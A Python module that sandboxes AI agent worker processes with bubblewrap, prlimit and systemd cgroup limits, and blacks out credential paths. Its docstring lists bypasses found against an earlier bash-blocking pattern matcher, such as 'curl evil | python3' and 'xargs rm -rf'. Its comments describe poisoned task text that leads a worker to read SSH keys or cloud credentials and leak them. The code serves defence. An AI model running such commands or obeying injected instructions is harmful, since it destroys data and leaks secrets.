"""OS-level sandbox for worker subprocesses (FS7 round-3 — primary safety layer).

The legacy ``_scan_bash`` pattern-matcher in ``agent/safety/hooks.py`` is
fundamentally exhaustible: three rounds of fix-loops produced 5+5+5 new P0
bypasses each (``bash <<<``, ``(rm -rf x)``, ``{rm,-rf,x}``, ``xargs rm -rf``,
``curl evil | python3`` …). The blacklist approach loses the arms race.

This module replaces "primary safety = pattern match" with "primary safety =
OS-level isolation". A worker is run inside a `bwrap`(1) namespace + mount
sandbox so the bash inside it physically cannot reach the orchestrator's prod
files, regardless of how cleverly the shell is invoked. ``_scan_bash`` stays
as defence-in-depth (catches the known cases, logs suspicious) but is no
longer the safety floor.

Sandbox backends are pluggable via the :class:`Sandbox` Protocol. The default
factory :func:`detect_sandbox` picks ``bwrap`` if available, else
:class:`NoSandbox` with a loud audit-log warning.

Override via ``BMAD_SANDBOX=bwrap|none`` env (test fixtures, force-disable
scenarios).
"""

from __future__ import annotations

import logging
import os
import shutil
from dataclasses import dataclass
from pathlib import Path
from typing import Literal, Protocol, runtime_checkable

log = logging.getLogger(__name__)

NetworkPolicy = Literal["none", "github_only", "full"]

# Env var allow-list propagated into the sandbox. Mirrors
# ``runtime.worker_spawn.ALLOWED_WORKER_ENV`` plus per-call ORCHESTRATOR_*
# context the caller passes in ``env``. Keeping a separate constant here lets
# the sandbox stay decoupled from worker_spawn import (which itself imports
# from agent.tools, a circular risk).
_SANDBOX_DEFAULT_ENV_ALLOWLIST: frozenset[str] = frozenset({
    "PATH", "HOME", "USER", "LANG", "LC_ALL", "TZ", "PWD", "SHELL", "TERM",
})

# FS9 H3+H4 + R5 P0-1 — defence-in-depth resource limits applied via ``prlimit(1)``.
# bwrap itself has no native rlimit flags; a worker that escapes the mount/net
# sandbox but stays in-process can still fork-bomb the host or fill tmpfs.
#
# CRITICAL — round 5 P0-1: `RLIMIT_NPROC` is **per-UID** in the kernel, not
# per-process-tree. A cap of 512 on a host with >512 processes under the
# orchestrator UID makes `clone()` (and thus `bwrap`) fail with EAGAIN
# *before* the namespace is created. Default raised from 512 → 16384 so the
# cap still blocks fork bombs (typical kernel hard limit ~250K) but does not
# refuse legitimate workers on busy hosts. For tighter per-cgroup isolation,
# see backlog `sandbox-cgroup-migration` (switch to `systemd-run --user
# --scope -p TasksMax=N`).
#
# FSIZE — `RLIMIT_FSIZE` caps SINGLE-FILE size, not aggregate. Workers can
# still fill /tmp by writing many files. Per-mount sizing or cgroup IO
# quotas needed for aggregate caps (deferred to sandbox-cgroup-migration).
DEFAULT_MAX_NPROC = 16384             # fork-bomb cap (per-uid count; see note above)
DEFAULT_MAX_AS_BYTES = 8 * 1024**3    # virtual memory ceiling (8 GiB)
DEFAULT_MAX_FSIZE_BYTES = 10 * 1024**3  # max single-file size (10 GiB); per-file ONLY, NOT aggregate
DEFAULT_MAX_NOFILE = 4096             # max open fds

# FS9 R5 P1-1 — minimum bounds for env overrides. A typo like
# `MAX_AS_BYTES=8589934` (8 MB instead of 8 GB) silently broke every Python
# worker; below these floors we ignore the override and log a warning.
_MIN_NPROC = 1024                     # below this bwrap clone() may fail
_MIN_AS_BYTES = 256 * 1024**2         # 256 MiB — Python interpreter needs ~50 MiB
_MIN_FSIZE_BYTES = 64 * 1024**2       # 64 MiB
_MIN_NOFILE = 256

# Env var override knobs (positive int → use if above minimum; otherwise default).
_ENV_NPROC = "BMAD_SANDBOX_MAX_NPROC"
_ENV_AS = "BMAD_SANDBOX_MAX_AS_BYTES"
_ENV_FSIZE = "BMAD_SANDBOX_MAX_FSIZE_BYTES"
_ENV_NOFILE = "BMAD_SANDBOX_MAX_NOFILE"

# Initiative #1 Task 1.3 — per-worker cgroup limits via ``systemd-run --user
# --scope``. prlimit's RLIMIT_NPROC is per-UID (see DEFAULT_MAX_NPROC note),
# so on a host that runs N parallel workers the per-UID total trivially
# exceeds the per-process cap and `clone()` fails. Cgroup-scoped limits
# (MemoryMax/CPUQuota/TasksMax) apply per scope unit instead, giving every
# worker its own enforced budget independent of host concurrency.
#
# These are layered ON TOP of prlimit (defence-in-depth). When systemd-run
# is unavailable the sandbox proceeds with prlimit only; pass
# ``BMAD_REQUIRE_CGROUP=1`` to make the cgroup layer mandatory in prod.
DEFAULT_CGROUP_MEMORY_MAX = "8G"
DEFAULT_CGROUP_CPU_QUOTA = "200%"
DEFAULT_CGROUP_TASKS_MAX = "16384"
DEFAULT_CGROUP_LIMITS: dict[str, str] = {
    "MemoryMax": DEFAULT_CGROUP_MEMORY_MAX,
    "CPUQuota": DEFAULT_CGROUP_CPU_QUOTA,
    "TasksMax": DEFAULT_CGROUP_TASKS_MAX,
}


def _systemd_run_available() -> tuple[bool, str | None]:
    """Return ``(available, path)`` for ``systemd-run --user --scope``.

    Requires both the binary on PATH *and* a usable user systemd
    (``$XDG_RUNTIME_DIR`` set + directory exists). On a host that booted
    without user-session systemd (`systemctl --user` would fail) the
    ``systemd-run --user`` invocation hangs trying to reach the user manager,
    so we refuse to prepend it rather than silently breaking spawn.
    """
    path = shutil.which("systemd-run")
    if not path:
        return False, None
    runtime_dir = os.environ.get("XDG_RUNTIME_DIR", "").strip()
    if not runtime_dir or not Path(runtime_dir).exists():
        return False, path
    return True, path


def _cgroup_required() -> bool:
    """``BMAD_REQUIRE_CGROUP=1`` (or true/yes) → fail-loud when cgroup unavailable."""
    return os.environ.get("BMAD_REQUIRE_CGROUP", "").strip().lower() in {"1", "true", "yes"}


def _env_positive_int(name: str, default: int, minimum: int | None = None) -> int:
    """Read ``name`` as positive int from env, fall back to ``default``.

    If ``minimum`` is provided and the env value is below it, log a warning
    and return ``minimum`` (FS9 R5 P1-1 — refuse silently-broken overrides).
    """
    raw = os.environ.get(name, "").strip()
    if raw.isdigit() and int(raw) > 0:
        val = int(raw)
        if minimum is not None and val < minimum:
            log.warning(
                "sandbox_rlimit_below_minimum: env=%s value=%d minimum=%d "
                "(using minimum; orchestrator would be unusable otherwise)",
                name, val, minimum,
            )
            return minimum
        return val
    return default


@runtime_checkable
class Sandbox(Protocol):
    """Pluggable OS-level isolation backend.

    Implementations wrap a command list with backend-specific isolation
    directives. The returned list is what the caller actually passes to
    ``asyncio.create_subprocess_exec`` / ``subprocess.Popen``.
    """

    @property
    def kind(self) -> str: ...

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
        worker_home_overlay: Path | None = None,
        cgroup_limits: dict[str, str] | None = None,
    ) -> list[str]:
        """Return ``cmd`` wrapped with backend isolation flags.

        Args:
            cmd: argv of the inner process (``["claude", "-p", ...]``).
            worktree: writable mount root. Anything outside is read-only or
                hidden depending on backend.
            readonly_paths: extra paths to expose read-only (e.g. shared
                source for retros). Validated as absolute.
            network: ``"none"`` isolates the netns (default — safest);
                ``"full"`` shares host net; ``"github_only"`` is currently
                treated as ``"full"`` (nftables whitelist deferred per spec
                §5 "Out of scope").
            env: env vars to inject. Caller is responsible for already
                running them through their allow-list; sandbox only
                forwards.
            worker_home_overlay: Initiative #1 Task 1.4 — per-worker HOME
                snapshot dir; when set the host's ``~/.claude*`` paths are
                replaced with same-named entries under this overlay.
                ``NoSandbox`` ignores this.
            cgroup_limits: Initiative #1 Task 1.3 — when set + systemd-run
                available, the spawn is wrapped in a per-worker
                ``systemd-run --user --scope`` with the given ``-p Key=Value``
                properties (e.g. ``{"MemoryMax": "8G", "CPUQuota": "200%"}``).
                ``NoSandbox`` ignores this.

        Returns:
            New argv list. ``NoSandbox`` returns ``cmd`` unchanged.
        """
        ...


@dataclass(frozen=True, slots=True)
class BwrapSandbox:
    """``bwrap``-backed sandbox (Bubblewrap, Flatpak's isolation primitive).

    Default policy:
      * ``--ro-bind / /`` — entire FS read-only.
      * ``--bind {worktree} {worktree}`` — worker can only write here.
      * ``--proc /proc``, ``--dev /dev`` — minimal proc/dev namespace.
      * ``--tmpfs /tmp`` — fresh empty tmpfs per invocation.
      * ``--tmpfs /sys`` — kernel info hidden (FS9 H1: LSM list, dmi, network
        topology otherwise readable via ``--ro-bind / /``).
      * ``--unshare-pid/uts/ipc/cgroup`` — namespace isolation.
      * ``--unshare-net`` iff ``network == "none"`` (default).
      * ``--die-with-parent`` — auto-cleanup if orchestrator dies.
      * ``--new-session`` — detach from controlling TTY.
      * ``--setenv K V`` per allow-listed env var; everything else stripped.

    The whole bwrap invocation is wrapped in ``prlimit(1)`` to enforce
    nproc / AS / fsize / nofile rlimits (FS9 H3+H4 — bwrap itself has no
    rlimit support).

    Read-only paths supplied via ``readonly_paths`` are additionally
    ``--ro-bind``ed. Useful for retros that read shared planning artifacts
    without granting write.
    """

    bwrap_path: str = "/usr/bin/bwrap"
    prlimit_path: str = "/usr/bin/prlimit"
    kind: str = "bwrap"

    def __post_init__(self) -> None:
        # FS9 H3+H4 — prlimit is a hard requirement; rlimits are the only
        # DoS defence inside the sandbox. Refuse to construct without it
        # rather than silently dropping resource caps.
        if not Path(self.prlimit_path).exists() and shutil.which("prlimit") is None:
            raise RuntimeError(
                f"prlimit not found at {self.prlimit_path!r} or on PATH; "
                "install util-linux (apt install util-linux) — required for "
                "sandbox resource limits."
            )

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
        worker_home_overlay: Path | None = None,
        cgroup_limits: dict[str, str] | None = None,
    ) -> list[str]:
        """Wrap ``cmd`` with bwrap isolation + optional cgroup + HOME overlay.

        Initiative #1 Task 1.3/1.4 additions:

        * ``worker_home_overlay`` — when supplied, the host's ``~/.claude``,
          ``~/.claude.json``, ``~/.local/share/claude`` binds are replaced
          with the same-named paths under this directory. Caller is
          responsible for snapshotting/creating the overlay (see
          :func:`runtime.worker_spawn._create_isolated_home`). Parallel
          workers each get their own overlay so they no longer race on the
          host's shared Claude state files.

        * ``cgroup_limits`` — when supplied and ``systemd-run --user --scope``
          is available, prepend a transient scope unit with the given
          ``-p Key=Value`` properties (typical: ``MemoryMax``, ``CPUQuota``,
          ``TasksMax``). The scope wraps prlimit+bwrap so the inner process
          tree is bound by per-cgroup quotas. If systemd-run is unavailable
          and ``BMAD_REQUIRE_CGROUP=1`` is set, raises; otherwise logs a
          warning and continues with prlimit only.
        """
        if not cmd:
            raise ValueError("cmd must be non-empty")
        wt_abs = Path(worktree).resolve(strict=False)
        if not wt_abs.is_absolute():
            raise ValueError(f"worktree must be absolute: {worktree!r}")
        overlay_abs: Path | None = None
        if worker_home_overlay is not None:
            if not Path(worker_home_overlay).is_absolute():
                raise ValueError(
                    f"worker_home_overlay must be absolute: {worker_home_overlay!r}"
                )
            overlay_abs = Path(worker_home_overlay).resolve(strict=False)
            if not overlay_abs.exists():
                raise FileNotFoundError(
                    f"worker_home_overlay does not exist: {overlay_abs}"
                )

        wrapped: list[str] = [
            self.bwrap_path,
            "--die-with-parent",
            "--new-session",
            "--ro-bind", "/", "/",
            "--proc", "/proc",
            "--dev", "/dev",
            "--tmpfs", "/tmp",  # noqa: S108 — bwrap mount point inside the sandbox namespace, not a host path
            "--tmpfs", "/sys",  # FS9 H1 — hide kernel info (LSMs, dmi, network)
            # FS9 R5 P0-2 — block individual /proc kernel fingerprint files.
            # ``/proc/version`` is needed by the Claude CLI (bun runtime reads
            # it on startup) so it stays exposed; the rest get redacted.
            "--ro-bind", "/dev/null", "/proc/cmdline",
            "--ro-bind", "/dev/null", "/proc/modules",
            "--ro-bind", "/dev/null", "/proc/kallsyms",
            "--ro-bind", "/dev/null", "/proc/cpuinfo",
            "--ro-bind", "/dev/null", "/proc/meminfo",
            "--bind", str(wt_abs), str(wt_abs),
            "--chdir", str(wt_abs),
            # Review finding H-1 — explicit blackouts on sensitive host paths.
            # ``--ro-bind / /`` exposes every readable file to the worker; a
            # poisoned story description ("read /home/server/crm/.env for
            # context") could exfil prod secrets, /etc/shadow, other users'
            # homes, or this user's auth tokens. Blackout = bind ``/dev/null``
            # over the path so reads return zero bytes regardless of how the
            # worker resolves the path. Order matters — these come AFTER the
            # blanket ``--ro-bind / /`` and BEFORE the writable workspace bind
            # so they override the open mount but never shadow legitimate work.
        ]
        # H-1 sensitive-path blackouts. Directories get an empty ``--tmpfs``
        # mount (writable but invisible to host); files get ``--ro-bind
        # /dev/null`` (zero-byte read). Tolerates missing host paths so the
        # rule list is identical across environments — test hosts without
        # ``/home/server/crm`` simply skip that entry.
        #
        # H-A security follow-up (Phase 4B re-review): expand to cover every
        # credential store and orchestrator-internal directory readable via
        # the ``--ro-bind / /`` mount. A poisoned story description that
        # tells the worker to ``cat ~/.ssh/id_rsa`` or
        # ``cat ~/.aws/credentials`` would otherwise exfiltrate to the
        # Anthropic API on the next reasoning turn (stdout JSONL flows back
        # to the parent and into the next prompt). Blackouts are applied
        # before the claude_subpaths binds below, so ``~/.claude/`` /
        # ``~/.claude.json`` / ``~/.local/share/claude/`` (worker-required)
        # remain accessible while everything else under $HOME is invisible.
        _host_home = os.path.expanduser("~")
        _SANDBOX_BLACKOUT_PATHS = (
            # System / other-user secrets (S10 H-1 baseline).
            "/home/server/crm",
            "/etc/shadow",
            "/etc/gshadow",
            "/etc/sudoers",
            "/etc/sudoers.d",
            "/root",
            # SSH keys, known_hosts, agent socket directory.
            f"{_host_home}/.ssh",
            # Cloud / registry credential stores.
            f"{_host_home}/.aws",
            f"{_host_home}/.gnupg",
            f"{_host_home}/.netrc",
            f"{_host_home}/.docker",
            f"{_host_home}/.kube",
            # CLI tool auth stores (github / gitlab / gcloud / azure).
            f"{_host_home}/.config/gh",
            f"{_host_home}/.config/git",
            f"{_host_home}/.config/gcloud",
            f"{_host_home}/.config/azure",
            f"{_host_home}/.gitconfig",
            # Orchestrator's own state (state.db, tokens, memory, runs).
            f"{_host_home}/.bmad-orchestrator",
            f"{_host_home}/.config/bmad-orchestrator",
        )
        for blackout in _SANDBOX_BLACKOUT_PATHS:
            blackout_path = Path(blackout)
            if not blackout_path.exists():
                continue
            if blackout_path.is_dir():
                wrapped += ["--tmpfs", blackout]
            else:
                wrapped += ["--ro-bind", "/dev/null", blackout]
        wrapped += [
            "--unshare-pid",
            "--unshare-uts",
            "--unshare-ipc",
            "--unshare-cgroup-try",
        ]

        # Claude CLI state: the binary writes config to ~/.claude.json,
        # plugin manifest to ~/.claude/, and version state to
        # ~/.local/share/claude/. Without writable mounts the worker
        # `claude -p` exits with EROFS / EACCES on startup.
        #
        # Initiative #1 Task 1.4: when ``worker_home_overlay`` is supplied,
        # bind from the overlay copy at <overlay>/.claude (etc) over the
        # host paths instead. The bwrap mount makes the worker see its
        # private snapshot at the same destination path the claude binary
        # resolves via $HOME — so no env change required.
        home = Path(os.path.expanduser("~"))
        claude_subpaths = (
            (".claude",),
            (".claude.json",),
            (".local", "share", "claude"),
        )
        for parts in claude_subpaths:
            host_path = home.joinpath(*parts)
            if overlay_abs is not None:
                src = overlay_abs.joinpath(*parts)
                # Only bind when overlay has the path; missing entries fall
                # through to no bind (the worker will create them in the
                # overlay's writable tmpfs at /tmp via $HOME-resolution).
                if src.exists():
                    wrapped += ["--bind", str(src), str(host_path)]
            elif host_path.exists():
                wrapped += ["--bind", str(host_path), str(host_path)]

        if network == "none":
            wrapped += ["--unshare-net"]
        # network="full" or "github_only" → share host netns (nftables
        # whitelist for github_only is deferred per spec §5).

        if readonly_paths:
            for p in readonly_paths:
                p_abs = Path(p).resolve(strict=False)
                if not p_abs.is_absolute():
                    raise ValueError(f"readonly_path must be absolute: {p!r}")
                wrapped += ["--ro-bind", str(p_abs), str(p_abs)]

        # Env propagation: clear ALL inherited env first, then forward only
        # the default allow-list + caller-provided ``env``. Without
        # ``--clearenv`` bwrap inherits the parent's env (incl.
        # ANTHROPIC_API_KEY etc), defeating the env-allowlist contract.
        wrapped += ["--clearenv"]
        merged_env: dict[str, str] = {
            k: os.environ[k]
            for k in _SANDBOX_DEFAULT_ENV_ALLOWLIST
            if k in os.environ
        }
        if env:
            merged_env.update(env)
        for k, v in merged_env.items():
            wrapped += ["--setenv", k, v]

        wrapped += ["--"]
        wrapped += list(cmd)

        # FS9 H3+H4 — prepend prlimit(1) outside the bwrap invocation so the
        # rlimits apply to the entire process tree (bwrap forks the inner
        # command; prlimit applies via setrlimit before exec, inherited by
        # all descendants).
        rlimit_wrapper = [
            self.prlimit_path,
            f"--nproc={_env_positive_int(_ENV_NPROC, DEFAULT_MAX_NPROC, _MIN_NPROC)}",
            f"--as={_env_positive_int(_ENV_AS, DEFAULT_MAX_AS_BYTES, _MIN_AS_BYTES)}",
            f"--fsize={_env_positive_int(_ENV_FSIZE, DEFAULT_MAX_FSIZE_BYTES, _MIN_FSIZE_BYTES)}",
            f"--nofile={_env_positive_int(_ENV_NOFILE, DEFAULT_MAX_NOFILE, _MIN_NOFILE)}",
            "--",
        ]
        full = rlimit_wrapper + wrapped

        if cgroup_limits:
            cgroup_prefix = _build_cgroup_prefix(cgroup_limits, worktree=wt_abs)
            if cgroup_prefix:
                full = cgroup_prefix + full
        return full


def _scope_unit_name(worktree: Path) -> str:
    """Build a deterministic-but-unique systemd scope unit name per spawn.

    Format: ``bmad-worker-<wt_basename>-<pid>-<monotonic_ms>.scope``. systemd
    requires names ≤256 chars and within ``[A-Za-z0-9:_.\\-]``; we sanitise
    the worktree basename to satisfy that and keep the human-readable hint.
    """
    import re
    import time
    base = re.sub(r"[^A-Za-z0-9_.-]", "_", worktree.name)[:64] or "wt"
    return f"bmad-worker-{base}-{os.getpid()}-{int(time.monotonic_ns() // 1_000_000)}"


def _build_cgroup_prefix(
    limits: dict[str, str], *, worktree: Path
) -> list[str] | None:
    """Return ``systemd-run --user --scope -p ... --`` argv prefix or ``None``.

    Returns ``None`` (silent skip) when ``systemd-run`` is unavailable AND
    ``BMAD_REQUIRE_CGROUP`` is unset. Raises ``RuntimeError`` when required
    but unavailable.
    """
    available, path = _systemd_run_available()
    if not available:
        if _cgroup_required():
            raise RuntimeError(
                "BMAD_REQUIRE_CGROUP=1 set but systemd-run --user is "
                "unavailable on this host (need systemd user manager + "
                "$XDG_RUNTIME_DIR). Install systemd or unset the env var."
            )
        log.warning(
            "cgroup_limits requested but systemd-run --user unavailable; "
            "proceeding with prlimit only (set BMAD_REQUIRE_CGROUP=1 to "
            "make this fatal in prod)"
        )
        return None
    assert path is not None
    prefix: list[str] = [
        path,
        "--user",
        "--scope",
        "--quiet",
        f"--unit={_scope_unit_name(worktree)}.scope",
    ]
    for key, value in limits.items():
        # systemd-run -p KEY=VALUE — values are passed verbatim to systemd
        # property parsing; we keep this minimal (no shell expansion).
        prefix += ["-p", f"{key}={value}"]
    prefix += ["--"]
    return prefix


@dataclass(frozen=True, slots=True)
class NoSandbox:
    """Fallback when no OS-level sandbox is available.

    ``wrap_command`` returns the command verbatim. On construction the
    factory logs a warning + emits an ``audit`` event so any prod
    deployment without ``bwrap`` is conspicuously flagged.
    """

    kind: str = "none"

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
        worker_home_overlay: Path | None = None,
        cgroup_limits: dict[str, str] | None = None,
    ) -> list[str]:
        if not cmd:
            raise ValueError("cmd must be non-empty")
        return list(cmd)


def _emit_no_sandbox_audit(reason: str) -> None:
    """Best-effort audit event when falling back to NoSandbox. Failures here
    must not block worker spawn — audit is observability, not gating."""
    try:
        from bmad_orchestrator.agent.safety.audit import record_audit
        record_audit(
            "sandbox_unavailable",
            sandbox_kind="none",
            reason=reason,
            severity="warning",
        )
    except Exception as exc:
        log.warning("audit emit failed for sandbox fallback: %s", exc)


_DISABLE_CONFIRMATION_TOKEN = "yes-i-accept-risk"  # noqa: S105 — not a secret, public confirmation token


def _require_sandbox() -> bool:
    """``BMAD_REQUIRE_SANDBOX=1`` (or true/yes) → fail-loud on NoSandbox.

    Production launchers (systemd units) MUST set this so a missing bwrap
    binary blocks startup instead of silently degrading to no isolation.
    """
    return os.environ.get("BMAD_REQUIRE_SANDBOX", "").strip().lower() in {"1", "true", "yes"}


def _disable_confirmed() -> bool:
    """Two-key confirmation for ``BMAD_SANDBOX=none``.

    Operator must set ``BMAD_SANDBOX_DISABLE_CONFIRMED=yes-i-accept-risk`` in
    the same env as ``BMAD_SANDBOX=none``. Prevents a stray child process or
    a misconfigured systemd drop-in from disabling the sandbox unnoticed.
    """
    return os.environ.get("BMAD_SANDBOX_DISABLE_CONFIRMED", "").strip() == _DISABLE_CONFIRMATION_TOKEN


def _enforce_require_sandbox(result: Sandbox, *, reason: str) -> None:
    """Raise if BMAD_REQUIRE_SANDBOX=1 and ``result`` is not a real sandbox."""
    if _require_sandbox() and not isinstance(result, BwrapSandbox):
        raise RuntimeError(
            "BMAD_REQUIRE_SANDBOX=1 set but no sandbox backend available "
            f"(reason={reason}); refusing to spawn workers. Install bwrap "
            "(apt install bubblewrap) or unset BMAD_REQUIRE_SANDBOX."
        )


def detect_sandbox() -> Sandbox:
    """Pick the best sandbox backend available.

    Order:
      1. ``BMAD_SANDBOX`` env override (``bwrap`` | ``none``).
         - ``none`` requires ``BMAD_SANDBOX_DISABLE_CONFIRMED=yes-i-accept-risk``
           (FS9 H6); else raises RuntimeError.
      2. ``shutil.which("bwrap")`` → :class:`BwrapSandbox`.
      3. fallback → :class:`NoSandbox` (loud audit warning).

    FS9 H5: if ``BMAD_REQUIRE_SANDBOX=1`` is set and the resolved backend is
    not a real sandbox (i.e. NoSandbox), raise RuntimeError. Production
    deployments MUST set this env var in their systemd unit / launcher.
    """
    override = os.environ.get("BMAD_SANDBOX", "").strip().lower()
    if override == "none":
        if not _disable_confirmed():
            raise RuntimeError(
                "BMAD_SANDBOX=none requires BMAD_SANDBOX_DISABLE_CONFIRMED="
                f"{_DISABLE_CONFIRMATION_TOKEN}. Disabling sandbox in "
                "production is dangerous — set the confirmation env var or "
                "remove BMAD_SANDBOX=none."
            )
        # H5 takes precedence over H6 confirmation — REQUIRE wins over override.
        result: Sandbox = NoSandbox()
        _enforce_require_sandbox(result, reason="env_override_none_confirmed")
        log.warning("BMAD_SANDBOX=none confirmed — worker isolation DISABLED")
        _emit_no_sandbox_audit("env_override")
        return result
    if override == "bwrap":
        path = shutil.which("bwrap")
        if not path:
            log.error("BMAD_SANDBOX=bwrap but bwrap not found in PATH")
            fallback: Sandbox = NoSandbox()
            _enforce_require_sandbox(fallback, reason="bwrap_override_missing_binary")
            _emit_no_sandbox_audit("bwrap_override_missing_binary")
            return fallback
        return BwrapSandbox(bwrap_path=path)

    path = shutil.which("bwrap")
    if path:
        return BwrapSandbox(bwrap_path=path)

    log.error(
        "bwrap not found on PATH — falling back to NoSandbox. "
        "Worker subprocess isolation DISABLED. Install `bubblewrap` "
        "(apt install bubblewrap) to restore primary safety layer."
    )
    fallback = NoSandbox()
    _enforce_require_sandbox(fallback, reason="bwrap_not_installed")
    _emit_no_sandbox_audit("bwrap_not_installed")
    return fallback


__all__ = [
    "DEFAULT_CGROUP_CPU_QUOTA",
    "DEFAULT_CGROUP_LIMITS",
    "DEFAULT_CGROUP_MEMORY_MAX",
    "DEFAULT_CGROUP_TASKS_MAX",
    "BwrapSandbox",
    "NetworkPolicy",
    "NoSandbox",
    "Sandbox",
    "detect_sandbox",
]
